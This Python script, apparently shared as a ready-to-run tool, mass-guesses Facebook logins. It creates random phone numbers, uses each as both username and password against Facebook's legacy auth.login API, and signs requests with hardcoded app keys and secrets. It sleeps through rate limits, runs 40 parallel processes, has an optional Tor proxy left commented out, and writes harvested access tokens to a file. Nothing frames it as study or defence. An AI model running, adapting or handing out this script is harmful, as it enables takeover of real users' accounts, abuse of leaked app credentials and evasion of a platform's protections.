import requests
import json
import time
import random
import hashlib
import threading
from multiprocessing import Process
from colorama import *

#import os
#import _thread
#import grequests

'''
import socks, socket

socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

'''
init()
print("------------------------------------")
print("Project Token Facebook")
print("------------------------------------")
print("V. 1 By : TitleHubz")


def phone(): 
    a = random.choice(["06","08","09"]) 
    b1 = random.choice("0123456789")
    b2 = random.choice("0123456789")
    b3 = random.choice("0123456789")
    b4 = random.choice("0123456789")
    b5 = random.choice("0123456789")
    b6 = random.choice("0123456789")
    b7 = random.choice("0123456789")
    b8 = random.choice("0123456789")
    b9 = random.choice("0123456789")
    phone1 = (a+b1+b2+b3+b4+b5+b6+b7+b8+b9)
    return phone1

def get_sig(a,k,u,p):
    sigmd5 = 'api_key=%s'% a + 'credentials_type=passwordemail=%s'% u +'format=JSONmethod=auth.loginpassword=%s'% p +'v=1.0%s'% k
    #print(sigmd5)
    return (hashlib.md5(sigmd5.encode()).hexdigest())

def get_url(a,k):
    phoneM = phone()
    u = phoneM
    p = phoneM
    print(Fore.YELLOW + '%s'%phoneM + Fore.RESET)
    url = 'https://api.facebook.com/restserver.php?api_key=%s'% a + '&credentials_type=password&email='+ u +'&format=JSON&method=auth.login&password='+ p +'&v=1.0&sig=' + get_sig(a,k,u,p)
    return url

aa = '882a8490361da98702bf97a021ddc14d'
ka = '62f8ce9f74b12f84c123cc23437a4a32'

ap = '3e7c78e35a76a9299309885393b02d97'
kp = 'c1e620fa708a1d5696fb991c1bde5662'

def maincurl():
    while True:
        url = get_url(aa,ka)
        #url = random.choice([get_url(aa,ka),get_url(ap,kp)])
        req = requests.get(url)
        j = json.loads(req.text)
        if 'access_token' in j :
            f = open("token.txt","a+")
            f.write(j['access_token'] + "\n")
            print(Fore.GREEN + '%s' %j['access_token'] + Fore.RESET)
            f.close()
            f1 = open("url.txt","a+")
            f1.write(url+"\n")
            f1.close()
        elif 'error_msg' in j :
            if (j['error_msg'] == "Calls to this api have exceeded the rate limit. (613)"):
                print (Fore.MAGENTA + 'Sleep 120 sec' + Fore.RESET)
                time.sleep(120)
            elif(j['error_msg'] == "Invalid username or password (401)"):
                print (Fore.RED + '%s'%j['error_msg'] + Fore.RESET)
            else:
                print (Fore.BLUE + '%s'%j['error_msg'] + Fore.RESET)
        else:
            pass
def maincurl2():
    while True:
        url = get_url(ap,kp)
        #url = random.choice([get_url(aa,ka),get_url(ap,kp)])
        req = requests.get(url)
        j = json.loads(req.text)
        if 'access_token' in j :
            f = open("token.txt","a+")
            f.write(j['access_token'] + "\n")
            print(Fore.GREEN + '%s' %j['access_token'] + Fore.RESET)
            f.close()
            f1 = open("url.txt","a+")
            f1.write(url+"\n")
            f1.close()
        elif 'error_msg' in j :
            if (j['error_msg'] == "Calls to this api have exceeded the rate limit. (613)"):
                print (Fore.MAGENTA + 'Sleep 120 sec' + Fore.RESET)
                time.sleep(120)
            elif(j['error_msg'] == "Invalid username or password (401)"):
                print (Fore.RED + '%s'%j['error_msg'] + Fore.RESET)
            else:
                print (Fore.BLUE + '%s'%j['error_msg'] + Fore.RESET)
        else:
            pass

if __name__ == '__main__':
    iq = 1
    while iq <= 20 :
        iq = iq +1
        h = Process(target=maincurl)
        h1 = Process(target=maincurl2)
        h.start()
        h1.start()

